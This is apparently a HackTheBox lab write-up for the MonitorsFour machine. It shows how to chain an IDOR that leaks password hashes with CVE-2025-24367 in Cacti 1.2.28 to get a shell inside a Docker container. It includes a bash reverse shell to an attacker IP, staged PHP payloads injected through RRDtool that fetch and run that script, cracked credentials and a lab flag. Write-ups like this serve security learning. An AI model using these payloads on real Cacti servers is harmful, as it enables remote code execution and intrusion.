# MonitorsFour - HackTheBox Attack Chain

## Target Information
- **IP Address:** 10.10.11.98
- **Hostname:** monitorsfour.htb
- **Difficulty:** Easy/Medium
- **OS:** Windows (with Docker/WSL2)

## Executive Summary
MonitorsFour is a Windows machine running a web application with a Cacti network monitoring subdomain. Initial access is achieved through a token parameter vulnerability that exposes user credentials, followed by exploitation of CVE-2025-24367 (Authenticated RCE in Cacti 1.2.28) to gain shell access inside a Docker container.

---

## Phase 1: Enumeration

### Port Scanning
```bash
nmap -sC -sV -oA nmap/initial 10.10.11.98
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | nginx |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |

### Web Application Discovery
- **Main Site:** `http://monitorsfour.htb` - Corporate networking solutions website
- **Tech Stack:** nginx + PHP 8.3.27
- **Login API:** `/api/v1/auth`
- **Password Reset:** `/api/v1/reset`

### Subdomain Enumeration
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.monitorsfour.htb" --hh 13688 http://10.10.11.98
```

**Found:** `cacti.monitorsfour.htb` (different response size)

### Cacti Discovery
- **URL:** `http://cacti.monitorsfour.htb/cacti/`
- **Version:** Cacti 1.2.28
- **Default Credentials:** `admin:admin` (limited permissions)

---

## Phase 2: Vulnerability Discovery

### Token Parameter Vulnerability (Critical)
The `/user` endpoint on the main site is vulnerable to an IDOR/authentication bypass via the `token` parameter.

```bash
curl -s "http://monitorsfour.htb/user?token=0"
```

**Exposed Credentials:**
| Username | Name | Role | MD5 Hash |
|----------|------|------|----------|
| admin | Marcus Higgins | super user | `56b32eb43e6f15395f6c46c1c9e1cd36` |
| mwatson | Michael Watson | user | `69196959c16b26ef00b77d82cf6eb169` |
| janderson | Jennifer Anderson | user | `2a22dcf99190c322d974c8df5ba3256b` |
| dthompson | David Thompson | user | `8d4a7e7fd08555133e056d9aacb1e519` |

### Hash Cracking
```bash
echo -n "wonderful1" | md5sum
# 56b32eb43e6f15395f6c46c1c9e1cd36  (matches admin hash)
```

**Cracked:** `admin (Marcus Higgins) : wonderful1`

### Cacti Access with Full Permissions
The `marcus:wonderful1` credentials work on Cacti with full administrator privileges (unlike `admin:admin` which has limited access).

```python
# Successful login as marcus
session.post("http://cacti.monitorsfour.htb/cacti/index.php", data={
    "action": "login",
    "login_username": "marcus",
    "login_password": "wonderful1",
    "__csrf_magic": csrf_token
})
```

**Key Access:** Graph Templates (required for CVE-2025-24367)

---

## Phase 3: Initial Access - CVE-2025-24367

### Vulnerability Details
- **CVE:** CVE-2025-24367
- **Type:** Authenticated Remote Code Execution
- **Affected Versions:** Cacti <= 1.2.28
- **Requirements:** Valid credentials with graph template access

### Exploitation Method
The vulnerability abuses insufficient input sanitization in graph template handling. By injecting malicious RRDtool commands into the `right_axis_label` parameter of the "Unix - Logged in Users" template (ID 226), arbitrary PHP files can be written to the web root.

### Exploit Steps

1. **Setup Listener:**
```bash
nc -lvnp 4455
```

2. **Serve Reverse Shell Payload:**
```bash
# /var/www/html/bash (via Apache)
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.10/4455 0>&1
```

3. **Stage 1 - Download Payload:**
```python
right_axis_label = """XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph payload1.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`curl\\x2010.10.16.10/bash\\x20-o\\x20/tmp/shell.sh`;?>
"""
# POST to graph_templates.php?header=false
# Trigger via graph_json.php?local_graph_id=3
# Access payload1.php to execute curl
```

4. **Stage 2 - Execute Payload:**
```python
right_axis_label = """XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph payload2.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`bash\\x20/tmp/shell.sh`;?>
"""
# Same process, access payload2.php to trigger reverse shell
```

### Shell Obtained
```
www-data@821fbd6a43fa:~/html/cacti$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Note:** We are inside a Docker container (hostname `821fbd6a43fa`)

---

## Phase 4: User Flag

```bash
www-data@821fbd6a43fa:$ cat /home/marcus/user.txt
87f9db79ef98e5c367d3ca15d2b70100
```

**User Flag:** `87f9db79ef98e5c367d3ca15d2b70100`

---

## Phase 5: Privilege Escalation (In Progress)

### Current Status
- Shell as `www-data` inside Docker container
- User `marcus` exists in container
- Need to escape Docker or pivot to host

### Enumeration Targets
1. Docker socket (`/var/run/docker.sock`)
2. Cacti database credentials (`/var/www/html/cacti/include/config.php`)
3. Internal network services
4. Mounted volumes from host
5. Docker API exploitation

### Next Steps
According to writeups, the attack chain involves:
1. Extract database credentials from Cacti config
2. Access internal Docker API
3. Exploit Docker Desktop vulnerability for container escape
4. Gain root access on Windows host

---

## Tools Used
- nmap - Port scanning
- ffuf/wfuzz - Directory and subdomain enumeration
- curl - HTTP requests
- hashcat/john - Hash cracking
- CVE-2025-24367-Cacti-PoC - Cacti RCE exploit
- netcat - Reverse shell listener

---

## References
- [CVE-2025-24367 PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
- [Cacti Security Advisory](https://github.com/Cacti/cacti/security/advisories)
- [HackTheBox MonitorsFour](https://www.hackthebox.com/machines/monitorsfour)

---

## Attack Chain Diagram
```
┌─────────────────────────────────────────────────────────────────┐
│                    MonitorsFour Attack Chain                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  [1] Enumeration                                                │
│      └── nmap → Port 80 (nginx), Port 5985 (WinRM)              │
│      └── vhost fuzzing → cacti.monitorsfour.htb                 │
│      └── Cacti 1.2.28 identified                                │
│                                                                  │
│  [2] Token Vulnerability                                        │
│      └── /user?token=0 → Exposes all user credentials           │
│      └── MD5 hash cracked: marcus:wonderful1                    │
│                                                                  │
│  [3] Cacti Authentication                                       │
│      └── marcus:wonderful1 → Full admin access                  │
│      └── Graph Templates accessible                             │
│                                                                  │
│  [4] CVE-2025-24367 Exploitation                                │
│      └── Inject RRDtool commands via right_axis_label           │
│      └── Stage 1: Download reverse shell script                 │
│      └── Stage 2: Execute bash payload                          │
│      └── Shell as www-data in Docker container                  │
│                                                                  │
│  [5] User Flag ✓                                                │
│      └── /home/marcus/user.txt                                  │
│      └── 87f9db79ef98e5c367d3ca15d2b70100                       │
│                                                                  │
│  [6] Privilege Escalation (TODO)                                │
│      └── Docker escape via API exploitation                     │
│      └── Root flag on Windows host                              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

*Last Updated: 2025-12-30*
